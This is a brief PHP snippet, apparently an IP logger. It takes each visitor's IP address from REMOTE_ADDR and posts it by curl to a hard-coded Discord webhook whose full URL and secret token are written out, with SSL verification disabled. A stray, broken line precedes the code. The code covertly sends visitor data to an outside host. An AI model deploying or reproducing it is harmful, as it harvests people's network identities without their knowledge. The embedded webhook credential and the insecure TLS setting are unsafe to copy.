$ txt = "IP: " . $_SERVER["REMOTE_ADDR"];

<?php

$url = "https://discord.com/api/webhooks/977798116013133904/Es0rxL_L86Igb_lb9HeDSW2jtRy4th7k5n5LUtGsgvCRD0hOXeeHt2E8kZZYfkMpjTKY";
$headers = [ 'Content-Type: application/json; charset=utf-8' ];
$POST = [ 'username' => 'Testing BOT', 'content' => $_SERVER["REMOTE_ADDR"]];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response   = curl_exec($ch);

?>